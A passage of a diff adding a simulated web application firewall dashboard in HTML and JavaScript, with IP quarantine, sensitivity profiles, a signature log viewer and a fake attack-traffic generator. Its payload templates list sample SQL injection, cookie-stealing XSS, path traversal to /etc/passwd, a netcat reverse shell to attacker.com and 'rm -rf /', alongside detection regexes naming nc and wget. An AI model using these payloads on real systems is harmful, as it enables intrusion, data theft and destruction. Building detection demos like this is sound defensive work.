+              <span class="text-yellow-400 text-sm">🛡️</span>
+            </div>
+            <div>
+              <div class="text-sm font-black mb-2" id="nmModeLabel">ACTIVE BLOCKING</div>
+              <button onclick="toggleEnforcement()" id="nmToggleBtn"
+                class="w-full flex items-center bg-[#080c08] border border-green-400/25 rounded-full p-1 transition">
+                <span id="nmToggleLeft"
+                  class="w-1/2 text-center text-[10px] font-black py-2 rounded-full bg-green-400 text-[#080c08] transition-all">
+                  ACTIVE BLOCKING
+                </span>
+                <span id="nmToggleRight"
+                  class="w-1/2 text-center text-[10px] font-black py-2 text-gray-600 transition-all">
+                  PASS-THROUGH
+                </span>
+              </button>
+              <div class="text-[9px] text-gray-600 mt-2" id="nmModeDesc">
+                Bad requests are dropped at the edge before reaching origin.
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- ============ SECTION 2: IP Access Control & Quarantine ============ -->
+      <div>
+        <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">
+          IP Access Control &amp; Quarantine
+        </div>
+        <div class="grid grid-cols-5 gap-3">
+
+          <!-- Manual IP Access Rule -->
+          <div class="col-span-2 bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-5 backdrop-blur space-y-3">
+            <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold">Manual IP Access Rule</div>
+            <input id="nmIpInput" type="text" placeholder="Enter IP Address (e.g., 192.168.1.100)"
+              class="w-full bg-[#080c08]/90 border border-green-400/20 text-gray-300 px-4 py-3
+                     rounded-lg text-xs mono outline-none focus:border-green-400/50
+                     placeholder:text-gray-700 placeholder:italic transition">
+            <div class="flex gap-2">
+              <button onclick="blockIP()"
+                class="flex-1 bg-red-500/15 border border-red-500/40 text-red-400 font-black
+                       text-xs tracking-widest uppercase py-3 rounded-lg hover:bg-red-500/25 transition">
+                ⛔ BLOCK IP
+              </button>
+              <button onclick="trustIP()"
+                class="flex-1 bg-green-400/15 border border-green-400/40 text-green-400 font-black
+                       text-xs tracking-widest uppercase py-3 rounded-lg hover:bg-green-400/25 transition">
+                🟢 TRUST IP
+              </button>
+            </div>
+            <div id="nmIpMsg" class="text-[10px] mono hidden"></div>
+          </div>
+
+          <!-- Quarantine List Table -->
+          <div class="col-span-3 bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-5 backdrop-blur">
+            <div class="flex items-center justify-between mb-3">
+              <span class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold">Quarantine List</span>
+              <span class="bg-red-500/10 border border-red-500/25 text-red-400 text-[10px] font-bold px-2.5 py-0.5 rounded-full" id="nmQCount">0 isolated</span>
+            </div>
+            <div class="overflow-x-auto">
+              <table class="w-full text-left border-collapse">
+                <thead>
+                  <tr class="border-b border-green-400/08">
+                    <th class="pb-2 px-2 text-[9px] text-gray-700 uppercase tracking-widest">IP Address</th>
+                    <th class="pb-2 px-2 text-[9px] text-gray-700 uppercase tracking-widest">Reason</th>
+                    <th class="pb-2 px-2 text-[9px] text-gray-700 uppercase tracking-widest">Time Isolated</th>
+                    <th class="pb-2 px-2 text-[9px] text-gray-700 uppercase tracking-widest"></th>
+                  </tr>
+                </thead>
+                <tbody id="nmQuarantineTable"></tbody>
+              </table>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- ============ SECTION 3: WAF Sensitivity Profiles ============ -->
+      <div>
+        <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">
+          WAF Sensitivity Profiles
+        </div>
+        <div class="grid grid-cols-3 gap-3">
+
+          <div id="profile-standard" onclick="selectProfile('standard')"
+               class="cursor-pointer bg-[#0c140c]/85 border border-green-400/40 rounded-2xl p-5
+                      backdrop-blur transition flash-card active">
+            <div class="flex items-center justify-between mb-2">
+              <span class="font-bold text-sm text-white">Standard Mode</span>
+              <span class="text-green-400 text-xs" id="profChk-standard">●</span>
+            </div>
+            <p class="text-[11px] text-gray-500 leading-relaxed">
+              Inspects standard request bodies for known attack signatures.
+            </p>
+          </div>
+
+          <div id="profile-strict" onclick="selectProfile('strict')"
+               class="cursor-pointer bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-5
+                      backdrop-blur transition flash-card">
+            <div class="flex items-center justify-between mb-2">
+              <span class="font-bold text-sm text-white">Strict Mode</span>
+              <span class="text-gray-700 text-xs" id="profChk-strict">○</span>
+            </div>
+            <p class="text-[11px] text-gray-500 leading-relaxed">
+              Enables aggressive header inspection and blocks special characters
+              (<span class="mono">' ; -- &lt;</span>) globally.
+            </p>
+          </div>
+
+          <div id="profile-audit" onclick="selectProfile('audit')"
+               class="cursor-pointer bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-5
+                      backdrop-blur transition flash-card">
+            <div class="flex items-center justify-between mb-2">
+              <span class="font-bold text-sm text-white">Audit Mode</span>
+              <span class="text-gray-700 text-xs" id="profChk-audit">○</span>
+            </div>
+            <p class="text-[11px] text-gray-500 leading-relaxed">
+              Disables active blocking and forwards all payloads while recording telemetry.
+            </p>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ================================================
+     SIGNATURE LOGS MODAL
+     Primary threat intelligence & audit repository.
+     Every request that trips a WAF signature lives here.
+================================================ -->
+<div id="sigOverlay"
+     class="fixed inset-0 z-[999] modal-bg hidden items-center justify-center p-5"
+     onclick="overlayClickSig(event)">
+  <div class="bg-[#0a120a] border border-green-400/20 rounded-2xl w-full max-w-6xl
+              max-h-[90vh] overflow-y-auto shadow-[0_0_80px_rgba(74,222,128,0.08)]
+              animate__animated animate__fadeInUp animate__faster">
+
+    <!-- Topbar -->
+    <div class="sticky top-0 z-10 flex items-center justify-between px-6 py-4
+                bg-[#0a120a]/98 backdrop-blur border-b border-green-400/10 rounded-t-2xl">
+      <div class="flex items-center gap-2.5 font-black text-lg">
+        <div class="w-8 h-8 bg-green-400 rounded-lg flex items-center
+                    justify-center shadow-[0_0_12px_rgba(74,222,128,0.4)]">🧾</div>
+        Sentinel <span class="text-green-400 ml-1">WAF</span>
+      </div>
+      <div class="flex items-center gap-3">
+        <div class="bg-green-400/15 border border-green-400/35 text-green-400
+                    px-4 py-1.5 rounded-full text-sm font-semibold">🧾 Signature Logs</div>
+        <div class="flex items-center gap-2 border border-green-400/20
+                    px-3 py-1.5 rounded-full">
+          <div class="w-2 h-2 bg-green-400 rounded-full dot-pulse"></div>
+          <span class="text-green-400 text-xs font-semibold">STREAMING</span>
+          <span class="text-gray-600 text-xs" id="sigLiveCountTxt">0 events</span>
+        </div>
+      </div>
+      <button onclick="closeSignatureLogs()"
+        class="w-9 h-9 rounded-full bg-red-500/12 border border-red-500/30
+               text-red-400 flex items-center justify-center text-lg font-bold
+               hover:bg-red-500/25 transition">✕</button>
+    </div>
+
+    <div class="p-6 space-y-4">
+
+      <!-- Filter & Search Controls -->
+      <div class="bg-[#0c140c]/85 border border-green-400/12 rounded-2xl p-4">
+        <div class="flex flex-wrap gap-2 items-center">
+          <input id="sigSearch" oninput="filterSigTable()"
+            placeholder="🔍 Search Rule ID, IP, payload..."
+            class="bg-[#080c08]/90 border border-green-400/20 text-gray-400
+                   text-xs px-4 py-2 rounded-full outline-none w-56
+                   focus:border-green-400/50 transition">
+
+          <select id="sigSeverityFilter" onchange="filterSigTable()"
+            class="bg-[#080c08]/90 border border-green-400/20 text-gray-400
+                   text-xs px-3 py-2 rounded-full outline-none focus:border-green-400/50 transition">
+            <option value="">All Severities</option>
+            <option value="CRITICAL">Critical</option>
+            <option value="HIGH">High</option>
+            <option value="MEDIUM">Medium</option>
+            <option value="INFO">Info</option>
+          </select>
+
+          <select id="sigActionFilter" onchange="filterSigTable()"
+            class="bg-[#080c08]/90 border border-green-400/20 text-gray-400
+                   text-xs px-3 py-2 rounded-full outline-none focus:border-green-400/50 transition">
+            <option value="">All Actions</option>
+            <option value="BLOCKED">Blocked</option>
+            <option value="LOGGED">Logged</option>
+            <option value="CHALLENGED">Challenged</option>
+            <option value="PASSED">Passed</option>
+          </select>
+
+          <button onclick="clearSigFilters()"
+            class="bg-green-400/10 border border-green-400/25 text-green-400
+                   text-xs px-3 py-2 rounded-lg hover:bg-green-400/18 transition">
+            ↺ Reset
+          </button>
+
+          <div class="flex-1"></div>
+
+          <span id="sigRowBadge"
+            class="bg-green-400/10 border border-green-400/25 text-green-400
+                   text-xs font-bold px-3 py-0.5 rounded-full">0 entries</span>
+
+          <button onclick="exportSigCSV()"
+            class="bg-green-400/10 border border-green-400/25 text-green-400 font-black text-xs px-3 py-2
+                   rounded-lg hover:bg-green-400/18 transition flex items-center gap-1.5">
+            📥 CSV
+          </button>
+          <button onclick="exportSigJSON()"
+            class="bg-green-400 text-[#080c08] font-black text-xs px-3 py-2
+                   rounded-lg hover:bg-green-300 transition flex items-center gap-1.5
+                   shadow-[0_0_15px_rgba(74,222,128,0.3)]">
+            📥 JSON
+          </button>
+        </div>
+      </div>
+
+      <!-- Live Inspection Stream -->
+      <div class="bg-[#0c140c]/85 border border-green-400/12 rounded-2xl p-5">
+        <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">
+          Live Inspection Stream — click a row to inspect
+        </div>
+        <div class="overflow-x-auto">
+          <table class="w-full text-left border-collapse">
+            <thead>
+              <tr class="border-b border-green-400/08">
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Time</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Source IP</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Rule ID</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Category</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Severity</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Action</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Payload</th>
+              </tr>
+            </thead>
+            <tbody id="sigTable"></tbody>
+          </table>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ================================================
+     LOG INSPECTOR MODAL (nested, opens above Signature Logs)
+================================================ -->
+<div id="logInspectorOverlay"
+     class="fixed inset-0 z-[1050] modal-bg hidden items-center justify-center p-5"
+     onclick="overlayClickInspector(event)">
+  <div class="bg-[#0a120a] border border-green-400/25 rounded-2xl w-full max-w-2xl
+              max-h-[90vh] overflow-y-auto shadow-[0_0_80px_rgba(74,222,128,0.12)]
+              animate__animated animate__fadeInUp animate__faster">
+
+    <div class="sticky top-0 z-10 flex items-center justify-between px-6 py-4
+                bg-[#0a120a]/98 backdrop-blur border-b border-green-400/10 rounded-t-2xl">
+      <div class="flex items-center gap-2.5 font-black text-base">
+        <span class="text-lg">🔎</span> Log Inspector
+        <span class="text-gray-600 font-normal text-xs mono" id="inspLogId">—</span>
+      </div>
+      <button onclick="closeLogInspector()"
+        class="w-8 h-8 rounded-full bg-red-500/12 border border-red-500/30
+               text-red-400 flex items-center justify-center text-base font-bold
+               hover:bg-red-500/25 transition">✕</button>
+    </div>
+
+    <div class="p-6 space-y-4">
+
+      <!-- Triggered Rule Metadata -->
+      <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-4">
+        <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">Triggered Rule Metadata</div>
+        <div class="grid grid-cols-2 gap-y-1.5 mono text-xs">
+          <div class="text-gray-600">Rule Name</div><div class="text-green-300" id="inspRuleName">—</div>
+          <div class="text-gray-600">Rule ID</div><div class="text-green-300" id="inspRuleId">—</div>
+          <div class="text-gray-600">Category</div><div class="text-green-300" id="inspCategory">—</div>
+          <div class="text-gray-600">Anomaly Score</div><div class="text-green-300" id="inspAnomaly">—</div>
+          <div class="text-gray-600">Severity</div><div id="inspSeverity">—</div>
+          <div class="text-gray-600">Action Taken</div><div id="inspAction">—</div>
+        </div>
+      </div>
+
+      <!-- Raw Request Payload -->
+      <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-4">
+        <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">Raw Request Payload</div>
+        <div class="bg-[#080c08]/90 border border-green-400/10 rounded-lg p-3 mono text-[11px] text-gray-400 space-y-1">
+          <div><span class="text-gray-600">Host:</span> <span class="text-gray-300">127.0.0.1:5000</span></div>
+          <div><span class="text-gray-600">Source IP:</span> <span class="text-gray-300" id="inspIP">—</span> <span id="inspGeo">—</span></div>
+          <div><span class="text-gray-600">User-Agent:</span> <span class="text-gray-300" id="inspUA">—</span></div>
+          <div><span class="text-gray-600">URI Path:</span> <span class="text-gray-300" id="inspURI">—</span></div>
+          <div class="pt-1 border-t border-green-400/10 mt-1">
+            <span class="text-gray-600">Decoded Parameter:</span>
+            <div class="text-red-300 break-all mt-1" id="inspPayload">—</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Matched Pattern -->
+      <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-4">
+        <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">Matched Pattern</div>
+        <div class="bg-[#080c08]/90 border border-yellow-500/20 rounded-lg p-3 mono text-[11px] text-yellow-300 break-all" id="inspPattern">—</div>
+      </div>
+
+      <!-- Operational Controls -->
+      <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-4">
+        <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">False Positive Management</div>
+        <div class="flex flex-wrap gap-2">
+          <button onclick="excludeParameter()"
+            class="bg-green-400/10 border border-green-400/25 text-green-400 text-xs font-semibold
+                   px-3 py-2 rounded-lg hover:bg-green-400/18 transition">
+            🧹 Exclude Parameter from Rule
+          </button>
+          <button onclick="addIPToWhitelist()"
+            class="bg-green-400/10 border border-green-400/25 text-green-400 text-xs font-semibold
+                   px-3 py-2 rounded-lg hover:bg-green-400/18 transition">
+            🟢 Add IP to Whitelist
+          </button>
+          <button onclick="suppressSignature()"
+            class="bg-yellow-500/10 border border-yellow-500/25 text-yellow-400 text-xs font-semibold
+                   px-3 py-2 rounded-lg hover:bg-yellow-500/18 transition">
+            🔕 Suppress Signature
+          </button>
+        </div>
+        <div id="inspActionMsg" class="text-[10px] mono text-green-400 mt-3 hidden"></div>
+      </div>
+
+    </div>
+  </div>
+</div>
+<script>
+/* ================================================
+   SENTINEL WAF — CONSOLIDATED ENGINE & UI LOGIC
+================================================ */
+
+/* GLOBAL STATE */
+let blocked = 0;
+let pendingBadge = 0;
+let logIdCounter = 1001;
+let enforcementActive = true;
+let sensitivityProfile = 'standard';
+let currentInspectedLogId = null;
+
+let sqlH = 0, xssH = 0, pathH = 0, cmdH = 0, botH = 0, rateH = 0, otherH = 0;
+
+const allRows = [];
+const quarantineList = [];
+const trustedIPs = [];
+const suppressedRuleIds = new Set();
+
+/* MAPPINGS & POOLS */
+const categoryMap = {
+  'SQL INJECTION' :'SQL Injection',
+  'XSS'           :'Cross-Site Scripting',
+  'PATH TRAVERSAL':'Path Traversal',
+  'CMD INJECTION' :'Command Injection',
+  'CODE INJECTION':'Remote File Inclusion',
+  'BOT SCRAPER'   :'Bot / Scraper Activity',
+  'RATE LIMIT'    :'Rate Limiting & Abuse',
+  'SUSPICIOUS'    :'Bot Mitigation',
+};
+
+const ruleIdPools = {
+  'SQL INJECTION' :['SQLi-Rule-104','SQLi-Rule-091','SQLi-Rule-077'],
+  'XSS'           :['XSS-002','XSS-014','XSS-029'],
+  'PATH TRAVERSAL':['LFI-Rule-021','LFI-Rule-033'],
+  'CMD INJECTION' :['CMDi-Rule-055','CMDi-Rule-062'],
+  'CODE INJECTION':['RFI-Rule-010','RFI-Rule-018'],
+  'BOT SCRAPER'   :['BOT-Rule-011','BOT-Rule-014','BOT-Rule-019'],
+  'RATE LIMIT'    :['RATE-Rule-201','RATE-Rule-205','RATE-Rule-212'],
+  'SUSPICIOUS'    :['BOT-Rule-003','BOT-Rule-007'],
+};
+
+const patternMap = {
+  'SQL INJECTION': "('|\"--|;|\\bUNION\\b|\\bSELECT\\b)",
+  'XSS'          : "<script.*?>|on\\w+\\s*=|javascript:",
+  'PATH TRAVERSAL': "(\\.\\./){2,}",
+  'CMD INJECTION' : "[;|&|`]{1,2}\\s*\\b(ls|cat|rm|nc|wget|whoami)\\b",
+  'CODE INJECTION': "<\\?php|eval\\(",
+  'BOT SCRAPER'   : "(bot|crawler|spider|scraper)",
+  'RATE LIMIT'    : "$^",
+  'SUSPICIOUS'    : "^(admin|root|system|config)$"
+};
+
+const geoPool = [
+  {country:'Russia',        flag:'🇷🇺'},
+  {country:'China',         flag:'🇨🇳'},
+  {country:'United States', flag:'🇺🇸'},
+  {country:'Germany',       flag:'🇩🇪'},
+  {country:'Brazil',        flag:'🇧🇷'},
+  {country:'India',         flag:'🇮🇳'},
+  {country:'Netherlands',   flag:'🇳🇱'},
+  {country:'Vietnam',       flag:'🇻🇳'},
+];
+
+const uaPool = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0',
+  'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0',
+  'python-requests/2.31.0',
+  'curl/8.6.0',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1',
+  'Go-http-client/1.1',
+  'Scrapy/2.11 (+https://scrapy.org)',
+];
+
+const uriPool = [
+  '/api/v1/auth','/admin','/checkout','/user/profile',
+  '/login','/api/v1/users','/search','/api/orders','/upload'
+];
+
+const ATTACK_PAYLOAD_TEMPLATES = {
+  'SQL INJECTION':[
+    "' OR '1'='1' --",
+    "1; DROP TABLE users; --",
+    "' UNION SELECT username, password FROM users--",
+    "admin'--",
+    "1' AND SLEEP(5)--",
+  ],
+  'XSS':[
+    "<script>alert(document.cookie)<\/script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert('xss')>",
+    "javascript:alert(1)",
+  ],
+  'PATH TRAVERSAL':[
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "/var/www/../../etc/shadow",
+  ],
+  'CMD INJECTION':[
+    "; cat /etc/passwd",
+    "| nc attacker.com 4444 -e /bin/sh",
+    "`whoami`",
+    "&& rm -rf /",
+  ],
+  'BOT SCRAPER':[
+    "python-requests scraping catalog at 40 req/sec",
+    "Headless Chrome fingerprint detected — no referer, no cookies",
+    "Automated crawler harvesting product data across pagination",
+  ],
+  'RATE LIMIT':[
+    "Burst of 500 requests/10s from a single client",
+    "Credential-stuffing pattern: 120 login POSTs/minute",
+    "Excessive polling — 90 req/min sustained for 10 minutes",
+  ],
+};
+
+const ATTACK_CATEGORIES = Object.keys(ATTACK_PAYLOAD_TEMPLATES);
+const SEVERITY_LEVELS = ['CRITICAL','HIGH','MEDIUM','LOW'];
+
+const typeColor = {
+  'SQL INJECTION' :'text-red-400 bg-red-500/10',
+  'XSS'           :'text-orange-400 bg-orange-500/10',
+  'PATH TRAVERSAL':'text-purple-400 bg-purple-500/10',
+  'CMD INJECTION' :'text-cyan-400 bg-cyan-500/10',
+  'CODE INJECTION':'text-fuchsia-400 bg-fuchsia-500/10',
+  'BOT SCRAPER'   :'text-pink-400 bg-pink-500/10',
+  'RATE LIMIT'    :'text-blue-400 bg-blue-500/10',
+  'SUSPICIOUS'    :'text-yellow-400 bg-yellow-500/10',
+};
+
+const sevColor = {
+  'CRITICAL':'text-red-500 font-black',
+  'HIGH'    :'text-orange-400 font-bold',
+  'MEDIUM'  :'text-yellow-400',
+  'LOW'     :'text-green-400',
+};
+
+const actionStyle = {
+  'BLOCKED'   :{icon:'🚫', cls:'bg-red-500/12 text-red-400 border border-red-500/25'},
+  'LOGGED'    :{icon:'📝', cls:'bg-yellow-500/12 text-yellow-400 border border-yellow-500/25'},
+  'CHALLENGED':{icon:'🧩', cls:'bg-purple-500/12 text-purple-400 border border-purple-500/25'},
+  'PASSED'    :{icon:'✅', cls:'bg-gray-500/12 text-gray-400 border border-gray-500/25'},
+};
+
+/* INITIALIZATION */
+document.addEventListener('DOMContentLoaded', function() {
+  const dc = document.getElementById('netDots');
+  if (dc && dc.children.length === 0) {
+    for (let i = 0; i < 5; i++) {
+      const d = document.createElement('span');
+      d.className = 'w-3 h-3 rounded-full bg-green-400 inline-block mr-3';
+      d.style = 'box-shadow:0 0 10px #4ade80;animation:dotPulse 1.2s ease-in-out ' + (i * 0.2) + 's infinite alternate';
+      dc.appendChild(d);
+    }
+  }
+
+  // Bind Enter Keys
+  const pInput = document.getElementById('payloadInput');
+  if (pInput) pInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') intercept(); });
+
+  const ipInput = document.getElementById('nmIpInput');
+  if (ipInput) ipInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') blockIP(); });
+});
+
+/* HELPER UTILITIES */
+function isPrivateOrReserved(a, b) {
+  if (a === 10 || a === 127 || a === 0 || a >= 224) return true;
+  if (a === 169 && b === 254) return true;
+  if (a === 172 && b >= 16 && b <= 31) return true;
+  if (a === 192 && b === 168) return true;
+  return false;
+}
+
+function randomIP() {
+  let a, b;
+  do {
+    a = Math.floor(Math.random() * 223) + 1;
+    b = Math.floor(Math.random() * 256);
+  } while (isPrivateOrReserved(a, b));
+  return a + '.' + b + '.' + Math.floor(Math.random() * 256) + '.' + (Math.floor(Math.random() * 254) + 1);
+}
+
+function pickRuleId(type) {
+  const pool = ruleIdPools[type] || ['GEN-Rule-001'];
+  return pool[Math.floor(Math.random() * pool.length)];
+}
+
+function computeAnomalyScore(sev) {
+  if (sev === 'CRITICAL') return 18 + Math.floor(Math.random() * 8);
+  if (sev === 'HIGH') return 10 + Math.floor(Math.random() * 7);
+  if (sev === 'MEDIUM') return 5 + Math.floor(Math.random() * 5);
+  return 1 + Math.floor(Math.random() * 4);
+}
+
+function actionBadge(action) {
+  const s = actionStyle[action] || actionStyle['LOGGED'];
+  return '<span class="text-[10px] font-black px-2.5 py-1 rounded-full ' + s.cls + ' flex items-center gap-1 w-fit">' + s.icon + ' ' + action + '</span>';
+}
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+}
+
+/* SIMULATION ENGINE */
+let simRunning = false;
+let simTimeoutId = null;
+let simEventCount = 0;
+
+function toggleSimulation() {
+  if (simRunning) stopSimulation();
+  else startSimulation();
+}
+
+function startSimulation() {
+  if (simRunning) return;
+  simRunning = true;
+  simEventCount = 0;
+
+  document.getElementById('simBtn')?.classList.add('sim-running');
+  document.getElementById('simBtnIcon').textContent = '⏹️';
+  document.getElementById('simBtnText').textContent = 'STOP SIMULATION';
+  document.getElementById('simProgressWrap').style.display = 'block';
+  
+  const status = document.getElementById('simStatus');
+  status.classList.remove('hidden');
+  status.textContent = '⚡ Streaming live attack traffic...';
+
+  scheduleNextAttack();
+}
+
+function scheduleNextAttack() {
+  if (!simRunning) return;
+  const delay = 300 + Math.random() * 500;
+  simTimeoutId = setTimeout(function() {
+    fireSimulatedAttack();
+    scheduleNextAttack();
+  }, delay);
+}
+
+function generateAttackEvent() {
+  const type = ATTACK_CATEGORIES[Math.floor(Math.random() * ATTACK_CATEGORIES.length)];
+  const pool = ATTACK_PAYLOAD_TEMPLATES[type];
+  const payload = pool[Math.floor(Math.random() * pool.length)];
+  const sev = SEVERITY_LEVELS[Math.floor(Math.random() * SEVERITY_LEVELS.length)];
+  const uri = uriPool[Math.floor(Math.random() * uriPool.length)];
+  return { payload, type, sev, uri };
+}
+
+function fireSimulatedAttack() {
+  const evt = generateAttackEvent();
+  processIntercept(evt.payload, evt.type, evt.sev);
+  simEventCount++;
+  const status = document.getElementById('simStatus');
+  if (status) {
+    status.textContent = '⚡ [' + simEventCount + '] ' + evt.type + ' → ' + evt.uri + ' :: ' + evt.payload.substring(0, 40);
+  }
+}
+
+function stopSimulation() {
+  simRunning = false;
+  if (simTimeoutId) { clearTimeout(simTimeoutId); simTimeoutId = null; }
+
+  document.getElementById('simBtn')?.classList.remove('sim-running');
+  document.getElementById('simBtnIcon').textContent = '⚡';
+  document.getElementById('simBtnText').textContent = 'START ATTACK STRESS TEST';
+  
+  const status = document.getElementById('simStatus');
+  status.textContent = '✅ Stress test stopped — ' + simEventCount + ' events fired.';
+  setTimeout(function() {
+    document.getElementById('simProgressWrap').style.display = 'none';
+    status.classList.add('hidden');
+  }, 2500);
+}
+
+/* MANUAL INTERCEPT */
+function intercept(){
+  const inputEl = document.getElementById('payloadInput');
+  if(!inputEl) return;
+  const raw = inputEl.value.trim();
+  if(!raw){ alert('⚠️ Enter a payload or request text.'); return; }
+
+  let type = null, sev = null;
+  const lc = raw.toLowerCase();
+
+  // Attack Signature Matching
+  if(lc.indexOf("'") > -1 || /\bor\b/i.test(lc) || lc.indexOf('union') > -1 || lc.indexOf('select') > -1) {
+    type = 'SQL INJECTION'; sev = 'HIGH';
+  } else if(lc.indexOf('<script') > -1 || lc.indexOf('javascript:') > -1 || lc.indexOf('onerror') > -1 || lc.indexOf('alert(') > -1) {
+    type = 'XSS'; sev = 'CRITICAL';
+  } else if(lc.indexOf('../') > -1 || lc.indexOf('etc/passwd') > -1) {
+    type = 'PATH TRAVERSAL'; sev = 'HIGH';
+  } else if(lc.indexOf('drop ') > -1 || lc.indexOf('delete ') > -1 || lc.indexOf('truncate') > -1) {
+    type = 'SQL INJECTION'; sev = 'CRITICAL';
+  } else if(lc.indexOf('exec') > -1 || lc.indexOf('shell') > -1 || lc.indexOf('| ls') > -1) {
+    type = 'CMD INJECTION'; sev = 'CRITICAL';
+  } else if(lc.indexOf('<?php') > -1 || lc.indexOf('eval(') > -1) {
+    type = 'CODE INJECTION'; sev = 'CRITICAL';
+  } else if(/^(admin|root|system|config)$/i.test(lc)) {
+    type = 'SUSPICIOUS'; sev = 'MEDIUM';
+  }
+
+  const btn = document.getElementById('interceptBtn');
+
+  if(type) {
+    // THREAT DETECTED
+    processIntercept(raw, type, sev);
+    if(btn){
+      btn.classList.replace('bg-green-400', 'bg-red-500');
+      btn.textContent = '🛡️ THREAT BLOCKED!';
+      setTimeout(function(){
+        btn.classList.replace('bg-red-500', 'bg-green-400');
+        btn.textContent = '⚡ INTERCEPT PAYLOAD VECTORS';
+      }, 900);
+    }
+  } else {
+    // CLEAN REQUEST
+    processCleanRequest(raw);
+    if(btn){
+      btn.classList.replace('bg-green-400', 'bg-blue-500');
+      btn.textContent = '✅ REQUEST PASSED (CLEAN)';
+      setTimeout(function(){
+        btn.classList.replace('bg-blue-500', 'bg-green-400');
+        btn.textContent = '⚡ INTERCEPT PAYLOAD VECTORS';
+      }, 900);
+    }
+  }
+
+  inputEl.value = '';
+}
+
+/* PROCESS CLEAN (BENIGN) REQUESTS */
+function processCleanRequest(raw) {
+  const now = new Date();
+  const entry = {
+    id: 'LOG-' + String(logIdCounter++).padStart(4, '0'),
+    date: now.toLocaleDateString('en-GB'),
+    time: now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
+    payload: raw,
+    type: 'CLEAN',
+    sev: 'LOW',
+    action: 'PASSED',
+    isNew: true,
+    ip: randomIP(),
+    geo: geoPool[Math.floor(Math.random() * geoPool.length)],
+    ua: uaPool[Math.floor(Math.random() * uaPool.length)],
+    uri: uriPool[Math.floor(Math.random() * uriPool.length)],
+    ruleId: 'PASS-000',
+    category: 'Normal Traffic',
+    anomalyScore: 0,
+    matchedPattern: 'None'
+  };
+
+  allRows.unshift(entry);
+  
+  // Refresh UI tables if open
+  const dashOverlay = document.getElementById('dashOverlay');
+  if(dashOverlay && !dashOverlay.classList.contains('hidden')){
+    renderTable(allRows);
+  }
+}
+
+function processIntercept(raw, type, sev) {
+  if (type === 'SQL INJECTION') sqlH++;
+  else if (type === 'XSS') xssH++;
+  else if (type === 'PATH TRAVERSAL') pathH++;
+  else if (type === 'CMD INJECTION') cmdH++;
+  else if (type === 'BOT SCRAPER') botH++;
+  else if (type === 'RATE LIMIT') rateH++;
+  else otherH++;
+
+  blocked++;
+  pendingBadge++;
+
+  const now = new Date();
+  const dateStr = now.toLocaleDateString('en-GB');
+  const timeStr = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+  const ruleId = pickRuleId(type);
+  const category = categoryMap[type] || 'Generic Anomaly';
+  let action;
+
+  if (suppressedRuleIds.has(ruleId)) {
+    action = 'PASSED';
+  } else if (type === 'SUSPICIOUS' || type === 'BOT SCRAPER' || type === 'RATE LIMIT') {
+    action = Math.random() < 0.5 ? 'CHALLENGED' : (enforcementActive ? 'BLOCKED' : 'LOGGED');
+  } else {
+    action = enforcementActive ? 'BLOCKED' : 'LOGGED';
+  }
+
+  const entry = {
+    id: 'LOG-' + String(logIdCounter++).padStart(4, '0'),
+    date: dateStr,
+    time: timeStr,
+    payload: raw,
+    type: type,
+    sev: sev,
+    action: action,
+    isNew: true,
+    ip: randomIP(),
+    geo: geoPool[Math.floor(Math.random() * geoPool.length)],
+    ua: uaPool[Math.floor(Math.random() * uaPool.length)],
+    uri: uriPool[Math.floor(Math.random() * uriPool.length)],
+    ruleId: ruleId,
+    category: category,
+    anomalyScore: computeAnomalyScore(sev),
+    matchedPattern: patternMap[type] || 'N/A',
+  };
+
+  allRows.unshift(entry);
+
+  updateRightPanel();
+  updateLast(raw, type);
+  flashCard('card-total');
+  flashCard('card-types');
+
+  const dashOpen = !document.getElementById('dashOverlay').classList.contains('hidden');
+  if (dashOpen) {
+    renderTable(allRows);
+    syncDash();
+    showAlert('🚨 ' + type + ' intercepted → "' + escapeHtml(raw.substring(0, 40)) + '"');
+    flashCard('lc-blocked');
